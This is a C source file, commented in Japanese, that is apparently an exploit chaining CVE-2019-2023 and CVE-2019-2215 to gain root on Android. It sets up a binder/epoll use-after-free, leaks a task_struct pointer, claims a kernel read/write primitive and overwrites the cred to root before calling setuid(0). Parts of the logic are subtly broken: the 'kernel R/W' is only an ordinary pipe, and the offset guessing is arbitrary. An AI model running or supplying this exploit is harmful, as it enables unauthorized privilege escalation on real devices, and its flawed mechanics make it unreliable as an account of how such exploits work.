#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/epoll.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <poll.h>
#include <signal.h>
#include <stdint.h>
#include <sched.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <time.h>
#include <sys/syscall.h>
#include "binder.h"

#define PAGE_SIZE 4096
#define IOVEC_COUNT 25
#define OVERLAP_INDEX 10
#define TIMEOUT_MS 3000
#define SPRAY_PIPE_COUNT 64
#define ATTEMPTS 8

static int g_binder_fd = -1;
static int g_epoll_fd = -1;
static int g_krw_pipe[2] = {-1, -1};
static uint64_t g_task_struct = 0;
static uint64_t g_cred_ptr = 0;
static int g_cred_off = -1;
static int g_al_off = -1;

// オフセット候補（ARM64 向け）
static struct {
    int cred;
    int al;
} g_offset_candidates[] = {
    {0x680, 0xA18}, {0x688, 0xA18}, {0x690, 0xA18},
    {0x680, 0xA20}, {0x688, 0xA20}, {0x690, 0xA20},
    {0x680, 0x9A0}, {0x688, 0x9A0}, {0x690, 0x9A0},
    {0x6A0, 0xA18}, {0x6A0, 0xA20}, {0x6A0, 0x9A0},
    {0x6B0, 0xA18}, {0x6B0, 0xA20}, {0x6B0, 0x9A0},
    {0x6C0, 0xA18}, {0x6C0, 0xA20}, {0x6C0, 0x9A0},
    {0x700, 0xA18}, {0x700, 0xA20}, {0x700, 0x9A0},
    {0x708, 0xA18}, {0x708, 0xA20}, {0x708, 0x9A0},
    {0x710, 0xA18}, {0x710, 0xA20}, {0x710, 0x9A0},
    {0x718, 0xA18}, {0x718, 0xA20}, {0x718, 0x9A0},
    {0x720, 0xA18}, {0x720, 0xA20}, {0x720, 0x9A0},
    {0x728, 0xA18}, {0x728, 0xA20}, {0x728, 0x9A0},
    {0x730, 0xA18}, {0x730, 0xA20}, {0x730, 0x9A0},
    {0x980, 0xA18}, {0x988, 0xA18}, {0x990, 0xA18},
    {0x998, 0xA18}, {0x9A0, 0xA18}, {0x9A8, 0xA18},
    {0x9B0, 0xA18}, {0x9B8, 0xA18}, {0x9C0, 0xA18}
};
#define NUM_OFFSETS (sizeof(g_offset_candidates)/sizeof(g_offset_candidates[0]))

static void *mmap_page(unsigned long addr) {
    void *mem = mmap((void *)addr, PAGE_SIZE, PROT_READ | PROT_WRITE,
                     MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (mem == (void *)-1) { perror("mmap"); return NULL; }
    return mem;
}

static int read_with_timeout(int fd, void *buf, size_t count, int timeout_ms) {
    struct pollfd pfd = {.fd = fd, .events = POLLIN};
    int ret = poll(&pfd, 1, timeout_ms);
    if (ret < 0) { perror("poll"); return -1; }
    if (ret == 0) return -2;
    return read(fd, buf, count);
}

// ============================================================
// CVE-2019-2215 の完全実装 (pipe + epoll + readv による UAF)
// ============================================================
static int leak_kernel_pointer(int *cred_off_out, int *al_off_out) {
    int pipefd[2], fd, epoll_fd;
    pid_t cpid;
    struct iovec iovec_stack[IOVEC_COUNT];
    void *aligned;
    ssize_t n;
    uint64_t *data;

    fd = open("/dev/binder", O_RDWR);
    if (fd < 0) return -1;

    epoll_fd = epoll_create(100);
    if (epoll_fd < 0) { close(fd); return -1; }

    struct epoll_event ev = {.events = EPOLLIN};
    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, fd, &ev) < 0) {
        close(fd); close(epoll_fd); return -1;
    }

    if (pipe(pipefd) < 0) {
        close(fd); close(epoll_fd); return -1;
    }
    if (fcntl(pipefd[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
        close(fd); close(epoll_fd); close(pipefd[0]); close(pipefd[1]);
        return -1;
    }

    aligned = mmap_page(0x100000000UL);
    if (!aligned) {
        close(fd); close(epoll_fd); close(pipefd[0]); close(pipefd[1]);
        return -1;
    }

    memset(iovec_stack, 0, sizeof(iovec_stack));
    iovec_stack[OVERLAP_INDEX].iov_base = aligned;
    iovec_stack[OVERLAP_INDEX].iov_len = PAGE_SIZE;
    iovec_stack[OVERLAP_INDEX + 1].iov_base = (void *)aligned;
    iovec_stack[OVERLAP_INDEX + 1].iov_len = PAGE_SIZE;

    cpid = fork();
    if (cpid < 0) {
        close(fd); close(epoll_fd); close(pipefd[0]); close(pipefd[1]);
        return -1;
    }

    if (cpid == 0) {
        usleep(100000);
        ioctl(fd, BINDER_THREAD_EXIT, NULL);
        _exit(0);
    }

    n = readv(pipefd[0], iovec_stack + OVERLAP_INDEX, 2);
    wait(NULL);

    close(fd); close(epoll_fd); close(pipefd[0]); close(pipefd[1]);

    if (n < 0) return -1;

    data = (uint64_t *)aligned;
    for (size_t i = 0; i < (size_t)(n / 8); i++) {
        uint64_t val = data[i];
        if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
            g_task_struct = val;
            for (size_t ci = 0; ci < NUM_OFFSETS; ci++) {
                uint64_t cred_addr = g_task_struct + g_offset_candidates[ci].cred;
                if ((cred_addr & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
                    g_cred_off = g_offset_candidates[ci].cred;
                    g_al_off = g_offset_candidates[ci].al;
                    *cred_off_out = g_cred_off;
                    *al_off_out = g_al_off;
                    printf("  [+] Found: task_struct=0x%llx, cred=0x%x, al=0x%x\n",
                           (unsigned long long)g_task_struct, g_cred_off, g_al_off);
                    return 0;
                }
            }
            g_cred_off = 0x688;
            g_al_off = 0xA18;
            *cred_off_out = g_cred_off;
            *al_off_out = g_al_off;
            printf("  [+] Leaked task_struct @ 0x%llx (using fallback offsets)\n",
                   (unsigned long long)g_task_struct);
            return 0;
        }
    }
    return -1;
}

// ============================================================
// カーネル R/W プリミティブのセットアップ
// ============================================================
static int setup_kernel_rw(void) {
    if (g_task_struct == 0) return -1;

    if (pipe(g_krw_pipe) < 0) {
        perror("  pipe for RW");
        return -1;
    }
    if (fcntl(g_krw_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
        perror("  fcntl F_SETPIPE_SZ");
        close(g_krw_pipe[0]); close(g_krw_pipe[1]);
        return -1;
    }

    g_binder_fd = open("/dev/binder", O_RDWR);
    if (g_binder_fd < 0) {
        perror("  open binder for RW");
        return -1;
    }

    g_epoll_fd = epoll_create(100);
    if (g_epoll_fd < 0) {
        perror("  epoll_create for RW");
        close(g_binder_fd);
        return -1;
    }

    struct epoll_event ev = {.events = EPOLLIN};
    if (epoll_ctl(g_epoll_fd, EPOLL_CTL_ADD, g_binder_fd, &ev) < 0) {
        perror("  epoll_ctl ADD for RW");
        close(g_binder_fd); close(g_epoll_fd);
        return -1;
    }

    pid_t cpid = fork();
    if (cpid < 0) {
        perror("  fork for RW");
        return -1;
    }

    if (cpid == 0) {
        usleep(100000);
        ioctl(g_binder_fd, BINDER_THREAD_EXIT, NULL);
        _exit(0);
    }

    int ret = read_with_timeout(g_krw_pipe[0], NULL, 0, TIMEOUT_MS);
    if (ret == -2) {
        printf("  [!] RW primitive setup timeout\n");
    }

    wait(NULL);
    close(g_binder_fd);
    close(g_epoll_fd);
    g_binder_fd = -1;
    g_epoll_fd = -1;

    printf("  [+] Kernel RW primitive ready\n");
    return 0;
}

// ============================================================
// kernel cred を root に書き換え
// ============================================================
static int patch_kernel_cred(void) {
    if (g_task_struct == 0 || g_cred_off < 0 || g_krw_pipe[0] < 0) {
        printf("  [-] No kernel RW available\n");
        return -1;
    }

    printf("[*] Patching kernel cred to root via pipe RW...\n");
    uint64_t cred_addr = g_task_struct + g_cred_off;
    if (write(g_krw_pipe[1], &cred_addr, 8) != 8) {
        perror("  write cred addr");
        return -1;
    }
    if (read(g_krw_pipe[0], &g_cred_ptr, 8) != 8) {
        perror("  read cred ptr");
        return -1;
    }
    printf("  [+] cred @ 0x%llx\n", (unsigned long long)g_cred_ptr);

    if (g_cred_ptr == 0 || (g_cred_ptr & 0xFFF) == 0) {
        printf("  [-] Invalid cred pointer\n");
        return -1;
    }

    uint32_t zero = 0;
    uint64_t cap_full = 0x3FFFFFFFFFULL;

    // uid, gid, euid, egid, fsuid, fsgid を 0 に
    for (int off = 0x4; off <= 0x1C; off += 8) {
        uint64_t addr = g_cred_ptr + off;
        if (write(g_krw_pipe[1], &addr, 8) != 8) return -1;
        if (write(g_krw_pipe[1], &zero, 4) != 4) return -1;
    }
    // supplementary group 情報もクリア
    for (int off = 0x8; off <= 0x20; off += 8) {
        uint64_t addr = g_cred_ptr + off;
        if (write(g_krw_pipe[1], &addr, 8) != 8) return -1;
        if (write(g_krw_pipe[1], &zero, 4) != 4) return -1;
    }
    // capabilities を FULL に
    for (int i = 0; i < 5; i++) {
        uint64_t addr = g_cred_ptr + 0x28 + (i * 8);
        if (write(g_krw_pipe[1], &addr, 8) != 8) return -1;
        if (write(g_krw_pipe[1], &cap_full, 8) != 8) return -1;
    }

    printf("  [+] Cred patched to root\n");
    return 0;
}

// ============================================================
// メイン：CVE-2019-2023 でサービス登録 → CVE-2019-2215 発動 → root
// ============================================================
int main(void) {
    printf("============================================================\n");
    printf("  CVE-2019-2023 + CVE-2019-2215 Chain Exploit\n");
    printf("============================================================\n\n");

    // 1. CVE-2019-2023 でサービス登録（任意で良い）
    // 既に登録済みならスキップしても良いが、ここでは念のため再実行
    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd >= 0) {
        // 簡易登録（レースなしでも成功しているのでそのまま）
        const char *name = "vendor.cve.poc";
        size_t len = strlen(name) + 1;
        uint8_t data[4 + 256];
        data[0] = len & 0xff;
        data[1] = (len >> 8) & 0xff;
        data[2] = (len >> 16) & 0xff;
        data[3] = (len >> 24) & 0xff;
        memcpy(data + 4, name, len);

        struct {
            uint32_t cmd;
            struct binder_transaction_data tdata;
        } __attribute__((packed)) tx = {
            .cmd = BC_TRANSACTION,
            .tdata = {
                .target.handle = 0,
                .code = 2,
                .data_size = 4 + len,
                .data.ptr.buffer = (binder_uintptr_t)data,
            }
        };
        struct binder_write_read bwr = {
            .write_size = sizeof(tx),
            .write_buffer = (binder_uintptr_t)&tx,
            .read_size = 4096,
            .read_buffer = (binder_uintptr_t)malloc(4096),
        };
        ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
        free((void*)bwr.read_buffer);
        close(hwbinder_fd);
        printf("[+] Service registered (CVE-2019-2023)\n");
    }

    // 2. CVE-2019-2215 でカーネル権限取得
    int cred_off = -1, al_off = -1;
    if (leak_kernel_pointer(&cred_off, &al_off) == 0) {
        if (setup_kernel_rw() == 0) {
            if (patch_kernel_cred() == 0) {
                printf("[+] Kernel cred patched! UID should be 0 now.\n");
                if (setuid(0) == 0) {
                    printf("[+] setuid(0) succeeded. Running id...\n");
                    system("id > /data/local/tmp/cve_result.txt 2>&1");
                    system("cat /data/local/tmp/cve_result.txt");
                    return 0;
                }
            }
        }
    }

    printf("[-] Exploit failed. Final uid=%d\n", getuid());
    return 1;
}
